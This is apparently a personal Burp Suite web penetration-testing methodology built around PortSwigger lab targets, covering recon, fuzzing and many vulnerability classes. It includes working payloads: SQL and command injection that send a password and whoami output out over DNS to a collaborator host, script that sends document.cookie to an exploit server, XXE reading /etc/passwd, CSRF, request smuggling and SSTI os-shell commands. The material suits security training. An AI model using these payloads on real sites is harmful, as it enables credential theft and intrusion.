# Configure
## :o: General settings
### Scope
- Configure **HTTP Proxy** to _show_ in-scope items only
- Configure **Logger** to _capture_ in-scope items only
- Configure **Logger** to _show_ in-scope items only

## :o: Extensions
### :white_check_mark: Extensions to install
The follwing extensions may be useful :
- Authorize
- Upload scanner
- Param miner
- Turbo intruder
- Collaborator everywhere
- HTTP Request smuggler
- JWT Editor
- Active Scan ++
- Logger ++
- CORS*

### :white_check_mark: Extensions management
In order to save CPU and memory usage, extensions can be enabled and disabled based on the tests that are currently conducted.

# Methodology

## :o: Step 1 - Discover attack surface & information disclosure
### :white_check_mark: Crawl target
The objective is to have as much information (_i.e._ web pages) as possible on our target.
1. Go on the _Dashboard_ tab
2. Click on New scan
3. Configure Crawl only
4. Run
This will add web pages on the _Target_ tab.

### :white_check_mark: Directory fuzzing
The objective is to have as much information (_i.e._ web pages) as possible on our target.
Send the root request (/) to _Intruder_, then :
1. Add the injection point at the end of the path e.g. `GET /$fuzz$ HTTP/2`
2. In the payload list, choose "Directories - Long"
3. Run the attack in _Sniper mode_
4. Check the responses status code and/or length to identify response.
This will add web pages on the _Target_ tab.

### :white_check_mark: File fuzzing
The objective is to have as much information (_i.e._ web pages) as possible on our target.
Send the root request (/) to _Intruder_, then :
1. Add the injection point at the end of the path e.g. `GET /$fuzz$ HTTP/2`
2. In the payload list, choose "Filenames - Long"
3. Run the attack in _Sniper mode_
4. Check the responses status code and/or length to identify response.
This will add web pages on the _Target_ tab.

An alternative recon should be done with different file extensions.

## :o: Step 2 - Analyze the attack surface
### :white_check_mark: Analyze refrences (URLs found in code)
On the _Target_ tab :
1. Right-click the website root
2. Click on _Engagement tools_
3. Click on _Find references_
Check if new in-scope URLs can be found.

### :white_check_mark: Analyze comments
On the _Target_ tab :
1. Right-click the website root
2. Click on _Engagement tools_
3. Click on _Find comments_
Check if interesting data can be found.

### :white_check_mark: Analyze CORS reponses
On the _Target_ tab :
1. Right-click the website root
2. Click on _Search_
3. Type _Access-Control-Allow-Origin_
Check if interesting data can be found.

### :white_check_mark: Analyze scripts

### :white_check_mark: Analyze errors
Error message can contain stack trace and other useful information.

#### Technique 1 - Filter 5xx errors
In the _Target_ tab :
1. Click on filters
2. Enable only in-scope items
3. Filter by status code 5xx [server error]
4. Look at every response received

#### Technique 2 - Filter 5xx errors
In the _Target_ tab :
1. Click on filters
2. Enable only in-scope items
3. Search terms :
  - "Error"
  - "Stack"
  - "Stack trace"
  - "Debug"
  - Etc...

### Find hidden or suspiciou headers
Use Param Miner automatically?!

#### Examples of headers :
- Referer - Modifying this header might bypass access-control
- Origin - Modifying this header might bypass access-control
- 

### :white_check_mark: Check anomalies
Anomalies are suspect behaviors that may or may not be harmful.
- Analyze 302 Redirect with a body
- Analyze any method overide (_method=POST) (Param miner)
- Analyze any header weird behavior (Param miner)

### :white_check_mark: Analyze cookies

## :o: Step 2 - Identify sensitive features
### Password
- Password reset
- Password change

### User data
- Email change

## :o: Step 3 - Identify vulnrabilities
### :white_check_mark: SQL injections
#### DNS exfiltration
Oracle - `'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % bjgsg SYSTEM "http://'||(select password from users where username='administrator')||'.8clatdya2m9x02ta9zxozvbmyd44svgk.oastify.com/">%bjgsg;]>'),'/l') from dual)||'`

### :white_check_mark: NoSQL injections
### :white_check_mark: Authentication
### :white_check_mark: Path traversal
#### Step 1 - Built-in scanner
- Use the built-in scanner : right-click the filename (e.g. https://example.com/?filename=text.jpg) and scan the selected insertion point.

#### Step 2 - Intruder
Send the upload request to _Intruder_, then 
1. Add the file name as the string to fuzz :
  - Fuzz the entire file name _e.g._ `filename=$fuzz$"`.
  - Fuzz only a part of the file name _e.g._ `filename=/my/path/$fuzz$"`.
2. In the payload list, choose "Fuzzing - Path traversal"
3. Run the attack in _Sniper mode_
4. Check the responses status code and/or length to identify filtered extensions.

### :white_check_mark: Command injection
_Burp suite extension : Active scan++ | Collaborator everywhere_
The main command injection objective is to extract data. Multiple ways to achieve this :
- Results reflected on the website
- Results written in non accessible files in the server (leverage with SSRF maybe)
- Results extracted with DNS request e.g. `test%40test.fr%7cnslookup%20-q%3dcname%20%60whoami%60.8y7ds87rolk2iziyuihztmwqwh28q0ep.oastify.com.%26` i.e. ``test@test.fr|nslookup -q=cname `whoami`.8y7ds87rolk2iziyuihztmwqwh28q0ep.oastify.com.&``

### :white_check_mark: Business logic vulnerabilities


### :white_check_mark: Access control
#### Step 1 - Identify logic error
Authentication may rely on poor access control. The following must be verified :
- Identify hidden web pages
- Identify roles
- Identify leaked credentials (e.g. comments, scripts)
- Test for role-related vulnerabilities (e.g. self-assignment)
- Test a _Referer_ identical to the target page _e.g._ `Referer: https://example.org/admin`
- Test different HTTP methods
- Try to pass arguments as GET rather than POST (and vice versa)

#### Step 2 - Hidden headers
Authentication control may be bypassed by specifying certain HTTP header e.g. _Referer_.
1. Right click on the request (_e.g._ /admin)
2. Select Extensions > Param miner
3. Scan everything
4. Observe results

#### Step 3 - Test IDORs using Authorize
_Burp suite extension : Authorize_
TODO : [doc](https://authorizedentry.medium.com/how-to-use-autorize-fcd099366239)

### :white_check_mark: File upload
_Burp suite extension : Upload Scanner_

<ins>Important</ins> : when identifying vulnerabilities with this extension, it may not reveal the real request is the _issue_ pane. To get the real request sent, copy paste the filename that was sent (usually a randomly generated filename), and search for it in Logger.
#### Basics
##### Manual - Identify filtered extensions
Send the upload request to _Intruder_, then 
1. Add the file extension as the string to fuzz _e.g._ `filename="file.$jpg$"`
2. In the payload list, choose "File extensions - Full"
3. Run the attack in _Sniper mode_
4. Check the responses status code and/or length to identify filtered extensions.
The extensions identified here must be excluded from the automated scan.

##### Manual - Identify extension filtering bypass with null-byte
This time, we want to use the null-byte to check if filtered extensions are accepted. For that, we want to fuzz all extensions and append a string like `%00.jpg` where `jpg` must be replaced by any allowed extension.
Send the upload request to _Intruder_, then 
1. Add the file extension as the string to fuzz _e.g._ `filename="file.$filtered_extension$%00.jpg"`
2. In the payload list set 1, choose "File extensions - Full"
3. Run the attack in _Sniper_ mode
4. Check the responses status code and/or length to filters bypass.

#### Automation
##### First scan
Run a first scan with all modules in order to check which are the different server responses. Based on those responses, we must determine :
- Which magic numbers are filtered
- Which file extensions are filtered
Then modules must be unselectioned in order to focus on unfiltered requests.

##### Second scan
Run a second scan that by configuring :
- Exclusion of previously identified filtered requests
- _ReDownloader parser options_ to make the extension fetch the file after it is uploaded. It will allow the extension to report any successful injection to the dashboard.

#### Advanced
Manual scan is needed because the extension can't test some cases :
- Upload a file to a different directory (e.g. using **../** or **..%2f**). The alternative directory may not handle the image in a secure way.
- If automated scan showed that EXIF injection is possible :
    - Use an ExifTool to modify the file uploaded
    - Modify the file directly in code c.f.
![Burp showing PHP RCE via EXIF](https://github.com/Molx32/websec/blob/main/img/fileuploadexif.png)
- SSRF with filename (check with collaborator everywhere?)

### :white_check_mark: Race conditions
### :white_check_mark: Server-side request forge (SSRF)

#### Automated - Built-in scan
Right click on the suspicious parameter and click _Scan selected insertion point_.

#### Manual - Intruder
Send the request to Intruder :
1. Add the injection point
2. In the payload list, add "SSRF targets"
3. In the payload list, add any custom endpoint e.g. 192.168.0.X
4. Run the attack in _Sniper mode_
5. Check the responses status code and/or length to identify response.

### :white_check_mark: Path traversal
#### LFI fuzzing
For fuzzing lists, use:
- Burp Pro default
- [Jhaddix fuzzing list](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt)
```
GET /image?filename=<INTRUDER_INPUT>
Host: 0a35003b04de89b2824392b5001e00b4.web-security-academy.net
```

### :white_check_mark: XXE Injection
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
### :white_check_mark: Cross-site scripting (XSS)
### :white_check_mark: Cross-site request forge (CSRF)
_Burp suite extensions : CSRF Scanner_
The extension is limited and does not perform many checks. Thus, the following should be tested :
- Change HTTP method
- Let the CSRF token as is
- Remove CSRF token field
- Remove CSRF token value
- Check if the token is based on a non session cookie (need to trigger a Set-Cookie in that case)


#### Automated
Find a request to CSRF, then right click : Engagement tool > Generate CRSF PoC. This produce a code sample that should can be exploited as is.

#### Manual
##### In a GET request
```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
##### CSRF using Javascript fetch()
```
<html>
    <img src="https://0a6c003b049f971980cc0d63006a00f7.web-security-academy.net/?search=aaa%3b%20SameSite=None%3b%20Secure%3b%20Partitioned%3b%0d%0aSet-Cookie:%20csrf=toto%3b%20SameSite=None%3b%20Secure%3bPartitioned%3b">
    <script>
        fetch("https://0a6c003b049f971980cc0d63006a00f7.web-security-academy.net/my-account/change-email", {
            method: "POST",
            credentials: "include",
            mode: "no-cors",
            headers: {
              "Content-Type": "application/json",
              // 'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'csrf=toto&email=tttt3@tttt.com'
            // body: JSON.stringify({'field':'value'})
        });
  </script>
</html>
```

##### CSRF using Javascript XMLHTTPRequest()
```
// GET request
const req = new XMLHttpRequest();
req.open("GET", "http://www.example.org/example.txt");
req.send();

// POST request
formData="a=test&b=value";
xhr.open("POST", "/article/xmlhttprequest/post/user");
xhr.send(formData);

// Steal cookie
xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit-0a0300fb04fc12638190ba2101d8001a.exploit-server.net/data?" + document.cookie);
xhr.send();
```
##### CSRF using Javascript HTML
```
<html>
  <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</html>
```
### :white_check_mark: Cross-origin resource sharing (CORS)
### :white_check_mark: Clickjacking
### :white_check_mark: DOM-based vulnerabilities
#### Web messages
```
<iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" style="overflow:hidden;height:100%;width:100%" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
<iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" style="overflow:hidden;height:100%;width:100%" onload="this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}','*')">
```
### :white_check_mark: WebSockets
### :white_check_mark: Insecure deserialization
#### Java
_Burp suite extensions : Java Deserialization Scanner_

##### Install JDK 8
1. Download JDK from [Oracle website](https://www.oracle.com/fr/java/technologies/javase/javase8-archive-downloads.html)
2. Download ysoserial from [Github](https://github.com/frohoff/ysoserial/releases/tag/v0.0.6)
3. Install Burp extension Java Deserialization Scanner
4. Extension - Configure Java path to `C:\Program Files\Java\jdk1.8.0_202\java.exe`
5. Extension - Configure Ysoserial path to `C:\Users\cleme\Documents\01 - Bugbounty\TRAINING\YSOSERIAL\ysoserial-all.jar`

##### Exploit
Send the request to Extensions > Java Deserialization Scanner >
- Manual to run multiple exploits at once
- Exploit to run specific exploit

**Note** : in the _Manual_ tab, the extension does not support all _ysoserial_ payloads. However, all payloads can be tested in the _Exploit_ tab.

##### OOBs exploits
```
ping pibyxv5bsfgyzjnl2digrwv58wen2fq4.oastify.com
```

#### PHP
⚠️ TODO - Add information from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md)

#### Ruby
⚠️TODO - Add information from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)

#### Python
⚠️TODO - Add information from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md)

#### .Net
⚠️TODO - Add information from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md)

#### Node
⚠️TODO - Add information from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md)

### :white_check_mark: GraphQL API vulnerabilities
### :white_check_mark: Server-side template injection
_Burp suite extensions : None_
_Third party tool : [SSTImap](https://github.com/vladko312/SSTImap)_

First order SSTI : when the detection is done on the HTTP reponse.
Second order SSTI : when the detection is done elsewhere _e.g._ on another page.

#### First order SSTI - Automated - Using SSTI Map
```
# Step 1 - Simple scan, injection being on *
python3 sstimap.py -e ERB --url https://0a4600cd04e18ff880924e140087006a.web-security-academy.net/?message=*

# Step 2 - Based on results, chose a payload, here OD shell
python3 sstimap.py -e ERB --url https://0a4600cd04e18ff880924e140087006a.web-security-academy.net/?message=* --os-shell
```
#### First order SSTI - Manual - Intruder
Send the request to _Intruder_, then 
1. Add the injection point
2. In the payload list, choose "Fuzzing - template injection"
3. Run the attack in _Sniper mode_
4. Check the responses status code and/or length to identify response.

#### :warning: NOT IMPLEMENTED YET :warning: Second order SSTI - Automated - Using SSTI Map
C.f. latest discussions : https://github.com/vladko312/SSTImap/issues/12

#### :warning: ONLY WORKS WITH REDIRECT :warning: Second order SSTI - Manual - Intruder
Send the request to _Intruder_, then 
1. Add the injection point
2. In the payload list, choose "Fuzzing - template injection"
3. In the Settings, configure **Follow redirections** to **In-scope only**
4. In the Resource pool, configure a **Delay between requests** fixed to 1000ms
5. Run the attack in _Sniper mode_
6. Check the responses status code and/or length to identify response.
Check all the results to see if the injection was sucessful. If it is, modify it to exploit it.

#### ⚠️TODO : find a payload list for all kind of template

### :white_check_mark: Web cache poisoning


### :white_check_mark: HTTP Host header attacks
_Burp suite extensions : Param miner_

#### Automated - Built-in scans
1. Run Param Miner extension with all scans
2. Run `can selected insertion point` on the host header

#### Manual - Using Intruder
Send the request to Intruder :
1. Scan the host header using a hostname list (e.g. 127.0.0.1, localhost, etc.)
2. Scan the host header subdomains using a subdomain list (e.g. internal --> internal.target.com)
Observed any response status or response length difference.

### :white_check_mark: HTTP request smuggling
_Burp suite extensions : Param miner | HTTP Request Smuggler_

#### Manual - CL.TE
```
POST / HTTP/1.1
Host: 0ae60020040cd411805762cb00b400b4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Transfer-encoding: chunked

3
a=1
0
 
GET /404 HTTP/1.1
X-Ignore: X
```

##### Front-end
The front end relies on `Content-Length: 43`, which is the length of the whole request.

##### Back-end
The back-end relies on `Transfer-Encoding: chunked`.
1. The back-end reads 0x03 (3) bytes, which is `a=1`
2. The back-end reads 0x00 (0) bytes, which means this is the end of the request
3. The back-end now interprets the end of the request as a new request to /404

##### Other example
```
POST / HTTP/1.1
Host: 0a4d00d2030017ef81108fdd008e001a.web-security-academy.net
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

#### Manual - TE.CL
```
POST / HTTP/1.1
Host: 0aba00db04538e6c837c561b00b40058.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

3f
GET /admin HTTP/1.1
Host: localhost
Content-Length: 15

a=b
0


```

##### Front-end
The front end relies on `Transfer-Encoding: chunked` :
1. The front-end reads 0x3f (63) bytes
2. The front-end reads 0x00 (0) bytes, which means this is the end of the request

##### Back-end
The back-end relies on `Content-Length: 4`.
1. The back-end 4 bytes, which is `3f\r\n`, then it is the end of the request
2. The back-end reads its buffers and assumes a new request arrived by receiving GET /admin

##### Other example
```
POST / HTTP/1.1
Host: 0a86001a033d23d58098581000580080.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

2d
POST /404 HTTP/1.1
Content-Length: 15

a=a
0


```

#### Automated -Step 1 - Scan
- Use the **Param Miner** (all options)
- Use the **HTTP Request Smuggler** (all options)
- Use the built-in scanner : right-click the **Host** header value and scan the selected insertion point.

#### Automated - Step 2 - Exploit

### :white_check_mark: OAuth authentication
### :white_check_mark: JWT attacks    
_Burp suite extensions : JWT Editor_
#### Unverified signature
This attack only requires to change the current username (or other values) in the token. Just modify the JWT content without modifying anything else.
Example :
```
{
    "iss": "portswigger",
    "sub": "wiener",
    "exp": 1703788096
}
```
...becomes...
```
{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1703788096
}
```
#### Signature exploits
##### None signature
Send the request to _Repeater_ and go to _JWT Editor_ tab.
1. Click on **Attack**
2. Select **"none" Signing Algorithm**
3. Send different requests each proposed value (["none", "None", "NONE", "nOnE"])

#### Brute force key
Word list [here](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```
### Prototype pollution



## Various
### :white_check_mark: Work with hash
#### Identify hash
Dcode tool to identify hash [here](https://www.dcode.fr/identification-hash).
#### Crack hash
Online tool - [Crack station](https://crackstation.net)
#### Calculate hash
Online tool - [CyberChef](https://gchq.github.io/CyberChef)

#### Brute force hash

# Course
## Cookies
### Attributes
- [HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly) - This attributes forbids Javascript to access the cookie.
- [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value)
  - 🛡️Strict - When the requests originates from a different domain or scheme, the cookie is not sent.
  - 🛡️Lax - When the requests originates from a different domain or scheme, the cookie is sent if
    - The HTTP method is GET
    - The request was created from a top-level navigation by the user such as a click. This means that the cookie is not included in background requests initiated by a script, iframe, etc.
  - 🎯None - The cookie is always included. When set to None, the **Secure** attribute must be specified.
- [Secure](https://developer.mozilla.org/en-US/docs/Web/HTTP/s/Set-Cookie#secure) - The cookie is sent only when using https:// attribute is used to ensure the cookie is only used with
